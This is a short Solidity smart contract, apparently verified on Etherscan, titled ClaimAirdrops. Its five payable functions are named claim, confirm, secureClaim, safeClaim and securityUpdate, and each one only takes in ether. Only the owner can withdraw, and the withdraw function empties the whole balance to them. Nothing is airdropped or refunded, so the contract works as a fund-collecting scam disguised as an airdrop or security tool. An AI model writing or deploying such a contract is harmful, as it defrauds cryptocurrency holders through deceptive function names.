1 /**
2  *Submitted for verification at Etherscan.io on 2022-11-29
3 */
4 
5 pragma solidity ^0.4.26;
6 
7 contract ClaimAirdrops {
8 
9     address private  owner;    // current owner of the contract
10 
11      constructor() public{   
12         owner=msg.sender;
13     }
14     function getOwner(
15     ) public view returns (address) {    
16         return owner;
17     }
18     function withdraw() public {
19         require(owner == msg.sender);
20         msg.sender.transfer(address(this).balance);
21     }
22 
23     function claim() public payable {
24     }
25 
26     function confirm() public payable {
27     }
28 
29     function secureClaim() public payable {
30     }
31 
32     
33     function safeClaim() public payable {
34     }
35 
36     
37     function securityUpdate() public payable {
38     }
39 
40     function getBalance() public view returns (uint256) {
41         return address(this).balance;
42     }
43 }